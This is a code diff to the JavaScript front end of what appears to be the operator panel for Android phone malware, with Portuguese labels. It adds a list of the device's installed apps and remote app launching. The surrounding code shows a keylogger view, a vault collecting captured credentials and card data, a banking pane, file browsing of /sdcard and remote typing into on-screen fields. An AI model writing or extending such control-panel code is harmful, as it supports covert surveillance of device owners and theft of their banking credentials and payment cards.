@@ -219,6 +219,7 @@ body.semAside aside{display:none}
 <script>
 const T=new URLSearchParams(location.search).get('t')||'';
 const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),wrap=$('#wrap');
+let apps=[],arvT=null;
 let w,sel='',geo={w:0,h:0},ovOn=false,lf=0,tp=0,recs=null,vNow='live',pasta='/sdcard',pend=null,kt=null,kpause=false,z=1,mag=false,nos=[],cofre=[],kl=[],kAt=0,recT=null,kN=0;
 function toq(x){const d=document.createElement('div');d.textContent=x;$('#toast').appendChild(d);setTimeout(()=>d.remove(),2600)}
 function log(x){const o=$('#out');o.textContent=(o.textContent+x+'\n').slice(-9000);o.scrollTop=o.scrollHeight}
@@ -255,6 +256,7 @@ function co(){
     else if(x.t==='ls'){lista(x.o)}
     else if(x.t==='dl'){baixa(x.o)}
     else if(x.t==='tree'){nos=x.o||[];if(vNow==='arvore')desenhaArv()}
+    else if(x.t==='applist'){apps=x.o||[];if(vNow==='arvore')desenhaArv()}
     else if(x.t==='bank'){$('#bankout').textContent=x.o}
     else if(x.t==='k'){kcarrega()}
     else if(x.t==='cred'||x.t==='cartao'){cofre.unshift(Object.assign({_t:x.t},x.o));desenhaCofre();toq(x.t+': '+(x.o.campo||''))}
@@ -309,7 +311,7 @@ function go(v){vNow=v;
     const e=$('#v-'+n);if(e)e.style.display=n===v?'block':'none'});
   $('#ht').textContent=v;
   clearInterval(kt);
-  if(v==='arvore'){c('tree');kt=setInterval(()=>{if($('#ar').checked)c('tree')},1500)}
+  if(v==='arvore'){pedeArv();kt=setInterval(()=>{if($('#ar').checked)pedeArv()},1500)}
   if(v==='tecla'){kcarrega();kt=setInterval(kcarrega,1500);marcaTecla(0);$('#hx').textContent='ao vivo'}
   else $('#hx').textContent='';
   if(v==='cofre')carregaCofre();
@@ -442,8 +444,20 @@ function preset(n){const q=$('#q'),f=$('#f'),r=$('#r');
 function desenhaArv(){
   const a=$('#arv');a.innerHTML='';
   const q=($('#af').value||'').toLowerCase();
+  const visA=apps.filter(o=>!q||(o.n||'').toLowerCase().includes(q)||(o.p||'').toLowerCase().includes(q));
   const vis=nos.filter(n=>!q||(n.t||'').toLowerCase().includes(q)||(n.cls||'').toLowerCase().includes(q));
-  if(!vis.length){a.textContent=nos.length?'nenhum nó com esse filtro':'árvore vazia';return}
+  if(!visA.length&&!vis.length){a.textContent=(nos.length||apps.length)?'nenhum item com esse filtro':'aguardando o aparelho';return}
+  visA.forEach(o=>{
+    const d=document.createElement('div');d.className='no';
+    const tx=document.createElement('span');tx.className='tx';tx.textContent=o.n;
+    const cl=document.createElement('span');cl.className='cl';cl.textContent=o.p;
+    d.appendChild(tx);d.appendChild(cl);
+    tx.onclick=()=>{c('open',{pkg:o.p});toq('abrir: '+o.n)};
+    const b=document.createElement('button');b.textContent='A';b.title='abrir';
+    b.onclick=ev=>{ev.stopPropagation();c('open',{pkg:o.p})};d.appendChild(b);
+    a.appendChild(d)});
+  if(visA.length&&vis.length){const h=document.createElement('div');h.className='cl';
+    h.textContent='--- tela atual ---';h.style.padding='6px 0 2px';a.appendChild(h)}
   vis.forEach(n=>{
     const d=document.createElement('div');d.className='no';d.style.paddingLeft=(n.d*10)+'px';
     const tx=document.createElement('span');tx.className='tx';
@@ -456,6 +470,11 @@ function desenhaArv(){
     if(n.e){const b=document.createElement('button');b.textContent='T';b.title='digitar neste campo';
       b.onclick=ev=>{ev.stopPropagation();pend={x:n.x,y:n.y};$('#t').placeholder='texto para o campo...';$('#t').focus()};d.appendChild(b)}
     a.appendChild(d)});
+}
+function pedeArv(){
+  clearTimeout(arvT);c('tree');c('applist');
+  arvT=setTimeout(()=>{if(vNow==='arvore'&&!nos.length&&!apps.length){
+    $('#arv').textContent='sem resposta do aparelho. confira se ele esta online.'}},3000);
 }
 $('#af').oninput=()=>{if(vNow==='arvore')desenhaArv()};
 function carregaCofre(tipo){
